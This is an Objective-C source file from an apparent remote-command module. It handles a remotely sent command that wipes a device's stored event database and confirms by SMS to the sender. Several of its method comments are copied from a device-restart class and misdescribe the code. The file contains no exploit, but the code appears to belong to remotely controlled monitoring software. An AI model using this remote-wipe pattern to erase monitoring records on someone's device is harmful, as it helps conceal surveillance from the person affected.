//
//  DeleteEventDatabaseProcessor.m
//  RCM
//
//  Created by Makara Khloth on 5/29/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "DeleteEventDatabaseProcessor.h"
#import "RemoteCmdUtils.h"

@interface DeleteEventDatabaseProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processDeleteEventDatabase;
@end

@implementation DeleteEventDatabaseProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RestartDeviceProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RestartDeviceProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"RestartDeviceProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RestartDeviceProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"DeleteEventDatabaseProcessor--->doProcessingCommand")
	[self processDeleteEventDatabase];
}


#pragma mark RestartDeviceProcessor

/**
 - Method name: processDeleteEventDatabase
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
 */

- (void) processDeleteEventDatabase {
	DLog (@"DeleteEventDatabaseProcessor--->processDeleteEventDatabase")
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository] dropRepository];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"DeleteEventDatabaseProcessor--->sendReplySMS")
	NSString *deleteEventDatabaseMessage = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							   andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:deleteEventDatabaseMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
														       andMessage:deleteEventDatabaseMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */


-(void) dealloc {
	[super dealloc];
}


@end

